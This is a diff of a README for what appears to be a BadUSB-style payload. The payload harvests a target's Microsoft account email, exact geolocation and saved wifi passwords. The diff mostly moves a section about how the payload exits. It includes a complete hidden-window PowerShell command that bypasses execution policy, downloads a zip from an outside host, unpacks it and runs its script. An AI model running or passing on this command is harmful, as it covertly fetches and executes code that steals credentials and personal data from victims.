@@ -27,10 +27,6 @@ Afterwards it will walk around your targets screen pulling out personal informat
 * Email associated with their microsoft account 
 * Their exact Geo Location 
 * The wifi networks and passwords
- 
-This payload will automatically end after 2 min 
-
-Or if you press `Left Control` + `Right Control` at the same time
 
 ## Getting Started
 
@@ -48,6 +44,11 @@ Or if you press `Left Control` + `Right Control` at the same time
 ```
 powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://jakoby.lol/1ae' -O "$D\hg.zip";Expand-Archive "$D\hg.zip" -Des $D -Force;. "$D\hg\main.ps1"
 ```
+### Exiting the Payload
+
+This payload will automatically end after 2 min 
+
+Or if you press `Left Control` + `Right Control` at the same time
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
